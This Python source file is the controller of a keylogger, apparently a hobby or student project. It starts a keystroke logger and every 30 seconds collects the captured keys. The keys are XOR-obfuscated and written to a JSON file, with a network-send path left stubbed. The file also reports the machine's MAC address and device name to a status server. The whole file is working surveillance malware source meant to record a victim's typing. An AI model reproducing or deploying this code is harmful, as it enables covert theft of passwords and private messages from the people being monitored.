import time, datetime, ctypes, threading
from key_logger import KeyLogger
from FileWriter import FileWriter
from encryption import Encryption
import requests
import uuid
from api_server import RequestManager


class Manager:

    def __init__(self, time_to_run=0, wright_to="json", time_wright=60):
        self.time_wright = time_wright
        self.keylogger = KeyLogger()
        self.file_writer = FileWriter()
        self.encryption = Encryption(5)
        self.running = False
        self.wright_to = wright_to
        self.time_to_run = time_to_run

    def collect_keys(self):
        while self.running:
            try:
                time.sleep(self.time_wright)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                    data = {timestamp: logged_keys}
                    # הצפנה
                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
                    print(encrypted_data)

                    # שליחה לקובץ
                    if self.wright_to == "json":
                        self.file_writer.Writes_to_file(encrypted_data)

                    #  שליחה לרשת (אם מופעל)
                    elif self.wright_to == "network":
                        pass  # self.network_writer.send(encrypted_data)

                    #  ניקוי ה-buffer
                    self.keylogger.clear_buffer()  # שים לב שזה כנראה צריך להיות בתוך KeyLogger
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def server_status_update(self, connected):
        mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
        status = {
            "macAddress": mac_address,
            "name": "מחשב נייד של דני",
            "connected": connected,
            "timeLimit": 180,
            "storageLocation": self.wright_to,
            "lastSeen": "2024-02-23 10:30"
        }
        RequestManager().handle_request('POST', "status", status)

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.server_status_update("true")
        self.collect_keys()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()


if __name__ == '__main__':
    a = Manager(time_wright=30)
    a.start()
